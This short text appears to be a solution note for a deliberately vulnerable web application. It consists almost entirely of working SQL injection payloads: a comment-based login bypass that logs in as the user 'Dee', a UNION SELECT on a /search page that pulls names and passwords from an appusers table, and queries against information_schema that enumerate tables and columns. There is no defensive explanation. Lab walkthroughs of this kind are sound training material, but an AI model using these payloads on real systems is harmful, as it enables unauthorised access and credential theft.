To bypass the login and login as 'Dee' either:
go to /login and enter:
```
username: Dee' --
```

go to the /search page and search for:
```sql
' AND 1=2 UNION SELECT name,pass,NULL,NULL,NULL FROM appusers --
```

' AND 1=2 UNION SELECT table_name, NULL, NULL, NULL, NULL FROM information_schema.tables WHERE table_schema = 'public' --

' AND 1=2 UNION SELECT table_name, column_name, NULL, NULL, NULL FROM information_schema.columns WHERE table_schema='public' --